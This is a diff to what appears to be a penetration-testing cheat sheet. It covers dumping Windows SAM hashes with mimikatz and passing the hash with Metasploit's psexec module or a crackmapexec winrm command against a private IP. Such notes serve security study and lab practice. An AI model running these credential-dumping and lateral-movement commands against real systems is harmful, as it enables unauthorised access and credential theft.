@@ -451,13 +451,11 @@ Upload your mimikatz.exe to target system and run .\mimikatz.exe
 
 mimikatz > lsadump::sam (NTLM hash)
 
-PASS THE HASH 
+PASS THE HASH (need to know NtLM hash)
 --------------
 
-metasploit smb/psexec module
-crackmapexec
- 
-
+metasploit exploit/windows/smb/psexec module
+(or)
 crackmapexec winrm 10.0.27.38 -u administrator -H '$HASH' -x "sysinfo"
 __________________________________________________________________________________________________________________________________
 
